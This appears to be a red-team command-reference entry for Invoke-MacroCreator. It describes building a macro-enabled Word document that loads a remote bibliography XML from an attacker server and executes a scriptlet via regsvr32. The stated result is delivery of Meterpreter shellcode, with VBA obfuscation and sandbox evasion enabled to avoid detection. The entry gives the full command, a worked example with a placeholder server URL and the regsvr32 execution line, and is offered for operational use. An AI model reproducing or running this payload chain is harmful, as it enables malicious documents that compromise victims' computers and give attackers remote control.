---
type: command
executor: powershell
data: >-
  Invoke-MacroCreator -i $_SCRIPTLET_FILE -t file -url $_SOURCES_URL -d biblio
  -c '$_EXEC_COMMAND' -o -e
tags:
  - macro
  - scriptlet
  - bibliography
  - covert-channel
  - evasion
platforms:
  - Windows
verified: true
validated: true
---

# invoke-macrocreator-deliver-scriptlet-via-bibliography

## Command

```powershell
Invoke-MacroCreator -i $_SCRIPTLET_FILE -t file -url $_SOURCES_URL -d biblio -c '$_EXEC_COMMAND' -o -e
```

## Description

This command creates a Word macro that loads an external scriptlet (.sct) via the bibliography XML source, executing it with regsvr32 for payload delivery. Obfuscation and sandbox evasion are enabled to avoid detection. The bibliography feature fetches sources.xml, which references the .sct, triggering execution. Use for advanced evasion against macro scanners.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_SCRIPTLET_FILE | Path to the scriptlet file (e.g., regsvr32.sct) | Yes |
| -t file | Specifies the payload type as a file (scriptlet) | Yes |
| -url $_SOURCES_URL | URL to the bibliography XML source (e.g., http://my.server.com/sources.xml) | Yes |
| -d biblio | Delivery method: bibliography covert channel | Yes |
| -c '$_EXEC_COMMAND' | Command to execute the scriptlet (e.g., 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll') | Yes |
| -o | Enable VBA code obfuscation | Yes (in this invocation) |
| -e | Enable sandbox evasion techniques | Yes (in this invocation) |

## Examples

### Basic Usage

```powershell
Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```

## Expected Output

Generates a .docm file (e.g., 'biblio_macro.docm'). Console: 'Bibliography macro created: biblio_macro.docm'. Enabling macros loads the XML, executes regsvr32 silently, runs the .sct, and delivers the shellcode for Meterpreter connection. Evasion checks (e.g., for VMs) prevent execution in analysis environments.

## Related

- [[procedures/Macro-Delivery-of-Meterpreter-Shellcode]]
- [[tools/Invoke-MacroCreator]]
